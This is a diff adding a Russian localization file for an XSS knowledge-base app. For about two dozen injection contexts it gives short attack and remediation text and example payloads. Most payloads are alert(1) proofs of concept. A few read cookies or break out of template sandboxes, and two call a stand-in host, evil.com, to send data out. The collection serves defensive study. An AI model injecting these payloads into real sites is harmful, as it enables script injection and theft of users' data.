@@ -1,0 +1,331 @@
+{
+  "app": {
+    "name": "BRS-KB База Знаний XSS",
+    "description": "Расширенная база данных разведки XSS для исследователей и сканеров",
+    "version": "Версия",
+    "loading": "Загрузка...",
+    "error": "Ошибка",
+    "success": "Успех",
+    "warning": "Предупреждение",
+    "info": "Информация"
+  },
+  "navigation": {
+    "home": "Главная",
+    "contexts": "Контексты",
+    "payloads": "Полезные нагрузки",
+    "playground": "Площадка",
+    "dashboard": "Панель",
+    "api_docs": "API Документация"
+  },
+  "contexts": {
+    "title": "Контексты уязвимостей XSS",
+    "description": "Изучите различные контексты уязвимостей XSS с детальными векторами атак и стратегиями исправления.",
+    "severity": "Серьезность",
+    "cvss_score": "Оценка CVSS",
+    "description": "Описание",
+    "attack_vector": "Вектор атаки",
+    "remediation": "Исправление",
+    "examples": "Примеры",
+    "payload_count": "Количество payloads"
+  },
+  "context_details": {
+    "html_content": {
+      "title": "Межсайтовое выполнение скриптов (XSS) в HTML-контенте",
+      "description": "Ввод пользователя отражается напрямую в тело HTML без надлежащей санитизации...",
+      "attack_vector": "КЛАССИЧЕСКИЕ ВЕКТОРЫ АТАКИ:\n\n1. ВСТРАИВАНИЕ ТЕГА SCRIPT:\n   <script>alert(document.cookie)</script>...",
+      "remediation": "СТРАТЕГИЯ ГЛУБОКИНОЙ ЗАЩИТЫ:\n\n1. КОДИРОВАНИЕ ВЫВОДА (ОСНОВНАЯ ЗАЩИТА):\n   Кодирование HTML-сущностей...",
+      "examples": [
+        {"name": "Базовый скрипт", "payload": "<script>alert('XSS')</script>"},
+        {"name": "Ошибка изображения", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    },
+    "websocket_xss": {
+      "title": "XSS в контексте WebSocket",
+      "description": "WebSocket XSS происходит, когда ввод пользователя отражается в сообщениях WebSocket...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ WEBSOCKET XSS:\n\n1. ВСТРАИВАНИЕ СООБЩЕНИЯ:\n   Сервер отправляет: ws.send(userMessage)...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ WEBSOCKET XSS:\n\n1. САНИТИЗАЦИЯ СООБЩЕНИЙ:\n   Санитизировать все исходящие сообщения WebSocket...",
+      "examples": [
+        {"name": "Сообщение чата", "payload": "{\"type\": \"chat\", \"message\": \"<script>alert(1)</script>\"}"},
+        {"name": "Имя пользователя", "payload": "{\"type\": \"user_joined\", \"username\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "service_worker_xss": {
+      "title": "XSS в контексте Service Worker",
+      "description": "Service Worker XSS происходит, когда ввод пользователя отражается в скриптах Service Worker...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ SERVICE WORKER XSS:\n\n1. ДИНАМИЧЕСКАЯ РЕГИСТРАЦИЯ:\n   navigator.serviceWorker.register('/sw.js?user=' + USER_INPUT)...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ SERVICE WORKER XSS:\n\n1. ВАЛИДАЦИЯ URL SERVICE WORKER:\n   Валидировать URL регистрации Service Worker...",
+      "examples": [
+        {"name": "Инъекция кэша", "payload": "data:text/javascript,self.addEventListener(\"install\",function(){fetch(\"http://evil.com/steal\")})"},
+        {"name": "Оффлайн XSS", "payload": "data:text/html,<script>alert(1)</script>"}
+      ]
+    },
+    "webrtc_xss": {
+      "title": "XSS в контексте WebRTC",
+      "description": "WebRTC XSS происходит, когда ввод пользователя отражается в каналах данных WebRTC...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ WEBRTC XSS:\n\n1. ИНЪЕКЦИЯ ДАННЫХ КАНАЛА:\n   WebRTC data channel: dataChannel.send(JSON.stringify({...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ WEBRTC XSS:\n\n1. ВАЛИДАЦИЯ ДАННЫХ КАНАЛА:\n   Валидировать сообщения канала данных...",
+      "examples": [
+        {"name": "Сообщение канала", "payload": "{\"type\": \"chat\", \"message\": \"<script>alert(1)</script>\"}"},
+        {"name": "Информация пира", "payload": "{\"type\": \"peer_info\", \"name\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "graphql_xss": {
+      "title": "XSS в контексте GraphQL",
+      "description": "GraphQL XSS происходит, когда ввод пользователя отражается в запросах GraphQL...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ GRAPHQL XSS:\n\n1. ИНЪЕКЦИЯ ПАРАМЕТРА ЗАПРОСА:\n   query GetUser($id: ID!) { user(id: $id) {...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ GRAPHQL XSS:\n\n1. ВАЛИДАЦИЯ ВВОДА:\n   Валидировать все входы GraphQL...",
+      "examples": [
+        {"name": "Запрос GraphQL", "payload": "query { user(id: \"<script>alert(1)</script>\") { name } }"},
+        {"name": "Мутация GraphQL", "payload": "mutation { updateProfile(input: { displayName: \"<script>alert(1)</script>\" }) { success } }"}
+      ]
+    },
+    "shadow_dom_xss": {
+      "title": "XSS в контексте Shadow DOM",
+      "description": "Shadow DOM XSS происходит, когда ввод пользователя отражается в элементах Shadow DOM...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ SHADOW DOM XSS:\n\n1. ИНЪЕКЦИЯ СОДЕРЖИМОГО СЛОТА:\n   <user-profile><span slot=\"name\">USER_INPUT</span></user-profile>",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ SHADOW DOM XSS:\n\n1. САНИТИЗАЦИЯ СОДЕРЖИМОГО:\n   Санитизировать все содержимое перед вставкой в Shadow DOM...",
+      "examples": [
+        {"name": "Слот Shadow DOM", "payload": "<span slot=\"content\"><script>alert(1)</script></span>"},
+        {"name": "Атрибут Shadow DOM", "payload": "<my-component title=\"<script>alert(1)</script>\"></my-component>"}
+      ]
+    },
+    "custom_elements_xss": {
+      "title": "XSS в контексте Custom Elements",
+      "description": "Custom Elements XSS происходит, когда ввод пользователя отражается в пользовательских элементах...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ CUSTOM ELEMENTS XSS:\n\n1. ELEMENT NAME INJECTION:\n   customElements.define(USER_INPUT, MyComponent)...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ CUSTOM ELEMENTS XSS:\n\n1. ВАЛИДАЦИЯ ELEMENT NAME:\n   Валидировать имена пользовательских элементов...",
+      "examples": [
+        {"name": "Имя элемента", "payload": "<script>alert(1)</script>"},
+        {"name": "Атрибут элемента", "payload": "<my-component data-value='<script>alert(1)</script>'></my-component>"}
+      ]
+    },
+    "http2_push_xss": {
+      "title": "XSS в контексте HTTP/2 Push",
+      "description": "HTTP/2 Push XSS происходит, когда ввод пользователя отражается в HTTP/2 push ресурсах...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ HTTP/2 PUSH XSS:\n\n1. PUSH PATH INJECTION:\n   server.push('/api/user/' + USER_INPUT)...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ HTTP/2 PUSH XSS:\n\n1. ВАЛИДАЦИЯ PUSH PATH:\n   Валидировать все push пути...",
+      "examples": [
+        {"name": "Путь push", "payload": "/api/user/<script>alert(1)</script>"},
+        {"name": "Содержимое push", "payload": "var userName = \"<script>alert(1)</script>\";"}
+      ]
+    },
+    "iframe_sandbox_xss": {
+      "title": "XSS в контексте iframe Sandbox",
+      "description": "iframe Sandbox XSS происходит, когда sandbox ограничения обходятся...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ IFRAME SANDBOX XSS:\n\n1. INCOMPLETE SANDBOX:\n   <iframe src=\"USER_CONTENT\" sandbox=\"allow-scripts\"></iframe>...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ IFRAME SANDBOX XSS:\n\n1. СТРОГИЙ SANDBOX:\n   Использовать строгий sandbox policy...",
+      "examples": [
+        {"name": "URI данных", "payload": "<iframe src='data:text/html,<script>alert(1)</script>' sandbox='allow-scripts'></iframe>"},
+        {"name": "Тот же origin", "payload": "<iframe src='/same-origin' sandbox='allow-same-origin allow-scripts'></iframe>"}
+      ]
+    },
+    "indexeddb_xss": {
+      "title": "XSS в контексте IndexedDB",
+      "description": "IndexedDB XSS происходит, когда ввод пользователя отражается в IndexedDB хранилище...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ INDEXEDDB XSS:\n\n1. STORAGE INJECTION:\n   store.add({id: userId, name: USER_INPUT})...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ INDEXEDDB XSS:\n\n1. САНИТИЗАЦИЯ STORAGE:\n   Санитизировать все данные перед хранением...",
+      "examples": [
+        {"name": "Профиль пользователя", "payload": "{\"name\": \"<script>alert(1)</script>\", \"email\": \"test@example.com\"}"},
+        {"name": "Хранение сообщений", "payload": "{\"content\": \"<script>alert(1)</script>\", \"type\": \"text\"}"}
+      ]
+    },
+    "webgl_xss": {
+      "title": "XSS в контексте WebGL",
+      "description": "WebGL XSS происходит, когда ввод пользователя отражается в WebGL шейдерах...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ WEBGL XSS:\n\n1. SHADER INJECTION:\n   const vertexShaderSource = 'attribute vec4 aVertexPosition; ' + USER_INPUT...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ WEBGL XSS:\n\n1. ВАЛИДАЦИЯ SHADER:\n   Валидировать все shader код...",
+      "examples": [
+        {"name": "Вершинный шейдер", "payload": "gl_Position = uModelViewMatrix * aVertexPosition; alert(1);"},
+        {"name": "Фрагментный шейдер", "payload": "gl_FragColor = vec4(0.0, 1.0, 0.0, 1.0); fetch('http://evil.com/steal')"}
+      ]
+    },
+    "css_context": {
+      "title": "XSS в контексте CSS",
+      "description": "CSS XSS происходит, когда ввод пользователя отражается в стилях CSS...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ CSS XSS:\n\n1. CSS EXPRESSION:\n   expression(alert(1))...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ CSS XSS:\n\n1. ВАЛИДАЦИЯ CSS:\n   Валидировать все CSS свойства...",
+      "examples": [
+        {"name": "CSS expression", "payload": "expression(alert(1))"},
+        {"name": "CSS URL", "payload": "background:url('javascript:alert(1)')"}
+      ]
+    },
+    "svg_context": {
+      "title": "XSS в контексте SVG",
+      "description": "SVG XSS происходит, когда ввод пользователя отражается в элементах SVG...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ SVG XSS:\n\n1. SVG ONLOAD:\n   <svg onload=alert(1)>...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ SVG XSS:\n\n1. САНИТИЗАЦИЯ SVG:\n   Санитизировать все SVG элементы...",
+      "examples": [
+        {"name": "SVG onload", "payload": "<svg onload=alert(1)>"},
+        {"name": "SVG script", "payload": "<svg><script>alert(1)</script></svg>"}
+      ]
+    },
+    "markdown_context": {
+      "title": "XSS в контексте Markdown",
+      "description": "Markdown XSS происходит, когда ввод пользователя отражается в рендеринге Markdown...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ MARKDOWN XSS:\n\n1. MARKDOWN LINK:\n   [XSS](javascript:alert(1))...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ MARKDOWN XSS:\n\n1. САНИТИЗАЦИЯ MARKDOWN:\n   Санитизировать все Markdown элементы...",
+      "examples": [
+        {"name": "Ссылка Markdown", "payload": "[XSS](javascript:alert(1))"},
+        {"name": "Изображение Markdown", "payload": "![XSS](javascript:alert(1))"}
+      ]
+    },
+    "json_value": {
+      "title": "XSS в контексте JSON",
+      "description": "JSON XSS происходит, когда ввод пользователя отражается в JSON данных...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ JSON XSS:\n\n1. JSON INJECTION:\n   {\"user\": \"<script>alert(1)</script>\"}...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ JSON XSS:\n\n1. ВАЛИДАЦИЯ JSON:\n   Валидировать все JSON данные...",
+      "examples": [
+        {"name": "Значение JSON", "payload": "{\"user\": \"<script>alert(1)</script>\"}"},
+        {"name": "Объект JSON", "payload": "{\"data\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "xml_content": {
+      "title": "XSS в контексте XML",
+      "description": "XML XSS происходит, когда ввод пользователя отражается в XML данных...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ XML XSS:\n\n1. XML INJECTION:\n   <user><name><script>alert(1)</script></name></user>...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ XML XSS:\n\n1. САНИТИЗАЦИЯ XML:\n   Санитизировать все XML элементы...",
+      "examples": [
+        {"name": "Содержимое XML", "payload": "<user><name><script>alert(1)</script></name></user>"},
+        {"name": "CDATA XML", "payload": "<content><![CDATA[<script>alert(1)</script>]]></content>"}
+      ]
+    },
+    "url_context": {
+      "title": "XSS в контексте URL",
+      "description": "URL XSS происходит, когда ввод пользователя отражается в URL...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ URL XSS:\n\n1. JAVASCRIPT PROTOCOL:\n   javascript:alert(1)...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ URL XSS:\n\n1. ВАЛИДАЦИЯ URL:\n   Валидировать все URL параметры...",
+      "examples": [
+        {"name": "Протокол JavaScript", "payload": "javascript:alert(1)"},
+        {"name": "URI данных", "payload": "data:text/html,<script>alert(1)</script>"}
+      ]
+    },
+    "dom_xss": {
+      "title": "XSS в контексте DOM",
+      "description": "DOM XSS происходит, когда ввод пользователя отражается в DOM...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ DOM XSS:\n\n1. LOCATION HASH:\n   location.hash...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ DOM XSS:\n\n1. ВАЛИДАЦИЯ DOM:\n   Валидировать все DOM манипуляции...",
+      "examples": [
+        {"name": "Хэш location", "payload": "location.hash"},
+        {"name": "URL документа", "payload": "document.URL"}
+      ]
+    },
+    "template_injection": {
+      "title": "XSS в контексте Template Injection",
+      "description": "Template Injection XSS происходит, когда ввод пользователя отражается в шаблонах...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ TEMPLATE INJECTION XSS:\n\n1. TEMPLATE SANDBOX ESCAPE:\n   {{constructor.constructor('alert(1)')()}}...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ TEMPLATE INJECTION XSS:\n\n1. TEMPLATE SANDBOXING:\n   Использовать template sandboxing...",
+      "examples": [
+        {"name": "Инъекция шаблона", "payload": "{{constructor.constructor('alert(1)')()}}"},
+        {"name": "Инъекция Angular", "payload": "{{7*7}}"}
+      ]
+    },
+    "postmessage_xss": {
+      "title": "XSS в контексте PostMessage",
+      "description": "PostMessage XSS происходит, когда ввод пользователя отражается в PostMessage API...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ POSTMESSAGE XSS:\n\n1. MESSAGE INJECTION:\n   postMessage(userInput, '*')...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ POSTMESSAGE XSS:\n\n1. ВАЛИДАЦИЯ MESSAGE:\n   Валидировать все PostMessage данные...",
+      "examples": [
+        {"name": "Данные PostMessage", "payload": "{\"type\": \"message\", \"data\": \"<script>alert(1)</script>\"}"},
+        {"name": "Источник PostMessage", "payload": "{\"source\": \"javascript:alert(1)\", \"data\": \"message\"}"}
+      ]
+    },
+    "wasm_context": {
+      "title": "XSS в контексте WebAssembly",
+      "description": "WebAssembly XSS происходит, когда ввод пользователя отражается в WebAssembly коде...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ WASM XSS:\n\n1. WASM INJECTION:\n   (module (func $xss (export \"xss\") (call $alert)))...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ WASM XSS:\n\n1. ВАЛИДАЦИЯ WASM:\n   Валидировать все WebAssembly код...",
+      "examples": [
+        {"name": "Импорт WASM", "payload": "(import \"env\" \"alert\" (func $alert))"},
+        {"name": "Глобальный WASM", "payload": "(global $xss (mut i32) (i32.const 0)) (export \"xss\" (global $xss))"}
+      ]
+    },
+    "html_attribute": {
+      "title": "XSS в контексте HTML Attribute",
+      "description": "HTML Attribute XSS происходит, когда ввод пользователя отражается в атрибутах HTML...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ HTML ATTRIBUTE XSS:\n\n1. ATTRIBUTE INJECTION:\n   <div data-text=\"USER_INPUT\">...</div>...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ HTML ATTRIBUTE XSS:\n\n1. ATTRIBUTE ENCODING:\n   Кодировать все HTML атрибуты...",
+      "examples": [
+        {"name": "Прорыв атрибута", "payload": "\"><script>alert(1)</script>"},
+        {"name": "Ошибка изображения", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    },
+    "html_comment": {
+      "title": "XSS в контексте HTML Comment",
+      "description": "HTML Comment XSS происходит, когда ввод пользователя отражается в комментариях HTML...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ HTML COMMENT XSS:\n\n1. COMMENT BREAKOUT:\n   <!-- USER_INPUT -->...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ HTML COMMENT XSS:\n\n1. COMMENT SANITIZATION:\n   Санитизировать все HTML комментарии...",
+      "examples": [
+        {"name": "Прорыв комментария", "payload": "--><script>alert(1)</script><!--"},
+        {"name": "Условный комментарий", "payload": "<!--[if IE]><script>alert(1)</script><![endif]-->"}
+      ]
+    },
+    "javascript_context": {
+      "title": "XSS в контексте JavaScript",
+      "description": "JavaScript Context XSS происходит, когда ввод пользователя инжектируется напрямую в JavaScript код...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ JAVASCRIPT CONTEXT XSS:\n\n1. VARIABLE INJECTION:\n   var data = USER_INPUT;...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ JAVASCRIPT CONTEXT XSS:\n\n1. JSON SERIALIZATION:\n   Использовать JSON сериализацию для JavaScript переменных...",
+      "examples": [
+        {"name": "Инъекция переменной", "payload": "1; alert(document.cookie); var x=1"},
+        {"name": "Инъекция функции", "payload": "1); alert(1); doSomething(1"}
+      ]
+    },
+    "js_string": {
+      "title": "XSS в контексте JavaScript String",
+      "description": "JavaScript String XSS происходит, когда ввод пользователя отражается в строках JavaScript...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ JS STRING XSS:\n\n1. STRING CONCATENATION:\n   var message = 'Hello ' + USER_INPUT...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ JS STRING XSS:\n\n1. STRING ENCODING:\n   Кодировать все строки JavaScript...",
+      "examples": [
+        {"name": "Конкатенация строк", "payload": "' + alert(1) + '"},
+        {"name": "Шаблонный литерал", "payload": "`${alert(1)}`"}
+      ]
+    },
+    "js_object": {
+      "title": "XSS в контексте JavaScript Object",
+      "description": "JavaScript Object XSS происходит, когда ввод пользователя отражается в объектах JavaScript...",
+      "attack_vector": "ВЕКТОРЫ АТАКИ JS OBJECT XSS:\n\n1. OBJECT PROPERTY INJECTION:\n   var config = {value: USER_INPUT}...",
+      "remediation": "СТРАТЕГИЯ ЗАЩИТЫ JS OBJECT XSS:\n\n1. OBJECT VALIDATION:\n   Валидировать все свойства объектов...",
+      "examples": [
+        {"name": "Свойство объекта", "payload": "1, alert: alert(1), real: 1"},
+        {"name": "Инъекция объекта", "payload": "null}; alert(1); var config = {value: null"}
+      ]
+    },
+    "default": {
+      "title": "XSS уязвимость",
+      "description": "Общая информация о XSS уязвимостях...",
+      "attack_vector": "ОБЩИЕ ВЕКТОРЫ АТАКИ XSS:\n\n1. SCRIPT INJECTION:\n   <script>alert('XSS')</script>...",
+      "remediation": "ОБЩАЯ СТРАТЕГИЯ ЗАЩИТЫ XSS:\n\n1. INPUT VALIDATION:\n   Валидировать все входные данные...",
+      "examples": [
+        {"name": "Базовый XSS", "payload": "<script>alert('XSS')</script>"},
+        {"name": "XSS изображения", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    }
+  },
+  "common": {
+    "loading": "Загрузка...",
+    "error": "Ошибка",
+    "success": "Успех",
+    "warning": "Предупреждение",
+    "info": "Информация",
+    "search": "Поиск",
+    "filter": "Фильтр",
+    "clear": "Очистить",
+    "export": "Экспорт",
+    "import": "Импорт",
+    "save": "Сохранить",
+    "cancel": "Отмена",
+    "confirm": "Подтвердить",
+    "yes": "Да",
+    "no": "Нет",
+    "total": "Всего",
+    "contexts": "Контексты",
+    "payloads": "Полезные нагрузки",
+    "severity": "Серьезность",
+    "cvss_score": "Оценка CVSS",
+    "description": "Описание",
+    "attack_vector": "Вектор атаки",
+    "remediation": "Исправление",
+    "examples": "Примеры",
+    "payload_count": "Количество payloads"
+  }
+}
+
